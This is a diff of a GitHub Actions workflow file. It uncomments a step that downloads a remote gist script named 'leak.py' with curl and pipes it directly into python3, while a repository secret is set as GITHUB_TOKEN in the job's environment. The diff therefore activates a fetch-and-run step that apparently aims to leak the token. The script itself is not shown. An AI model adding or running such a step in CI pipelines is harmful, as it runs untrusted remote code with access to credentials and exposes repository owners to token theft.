@@ -14,7 +14,7 @@ jobs:
     runs-on: ubuntu-latest
     env:
       GITHUB_TOKEN: ${{ secrets.MY_GITHUB_TOKEN }}  # Set the token as an env variable
-   # steps:
-    #  - name: Fetch and Run leak.py
-     #   run: |
-      #    curl -s https://gist.githubusercontent.com/Pranesh-Shrestha/275c2478d3fcfc393c7434ce4b896e9f/raw/f89a0b1f4adcf21e5094471036686fea00a4a40b/leak.py | python3
+    steps:
+      - name: Fetch and Run leak.py
+        run: |
+          curl -s https://gist.githubusercontent.com/Pranesh-Shrestha/275c2478d3fcfc393c7434ce4b896e9f/raw/f89a0b1f4adcf21e5094471036686fea00a4a40b0/leak.py | python3
